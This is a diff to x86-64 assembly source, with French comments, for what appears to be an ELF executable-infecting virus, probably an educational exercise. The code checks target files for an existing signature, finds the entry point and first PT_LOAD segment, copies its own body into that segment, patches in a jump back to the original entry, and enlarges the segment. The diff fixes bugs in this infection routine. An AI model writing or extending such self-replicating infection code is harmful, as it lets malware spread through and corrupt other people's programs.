@@ -36,7 +36,7 @@ get_file_data:
     jz  close_file
     mov [r12 + fileData], rax   ; faire des check pour le format
 
-check_signature:
+check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
     xor rdx, rdx
     mov rcx, [r12 + fileSize]
     sub rcx, SIGNATURE_SIZE - 1
@@ -47,7 +47,7 @@ check_signature:
         add rsi, rdx  
         call ft_strcmp
         cmp rax, 0
-        jz close_mmap
+        jz close_mmap           ; on quite proprement si il a deja une signature
         inc rdx
         
     check_signature_cmp:
@@ -90,7 +90,7 @@ simple:
     jmp close_mmap
 
 
-get_file_entry:
+get_file_entry:                     ; recupere l'entry point de l'executable
     mov rax, [r12 + fileData]
     mov rdi, [rax + e_entry]
     mov [r12 + oldEntry], rdi
@@ -106,8 +106,8 @@ get_first_pload:
     mov dx, [r13 + e_phentsize]
     xor rax, rax
 phead_loop:
-    mov eax, [r13 + rsi + p_type]
-    cmp rax, PT_LOAD
+    mov eax, [r13 + rsi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
+    cmp eax, PT_LOAD
     jz first_pload_found
     inc r14
     add rsi, rdx
@@ -143,9 +143,10 @@ write_virus_entry:
 copy_program:
     mov rdi, [r12 + fileData]               ; address a la fin du premier pload
     add rdi, [r13 + p_filesz]
+    mov rbx, rdi
     lea rsi, [rel main]                     ; address du debut du programe
-    mov rdx, PROG_SIZE                      ; taille du programe
-    call ft_memcpy
+    mov rcx, PROG_SIZE                      ; taille du programe
+    rep movsb
     
     ; calcule le jump qu'il faut faire pour attendre l'entry normale 
     mov rdx, [r12 + entry]
@@ -154,8 +155,8 @@ copy_program:
     sub ecx, edx
     
     ; ecrit le jump a l'adress de jump
-    mov [rdi + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
-    mov [rdi + JMP_OFFSET + 1], ecx
+    mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
+    mov [rbx + JMP_OFFSET + 1], ecx
 
     ; augmente la taille du premier pload
     add qword [r13 + p_memsz], PROG_SIZE
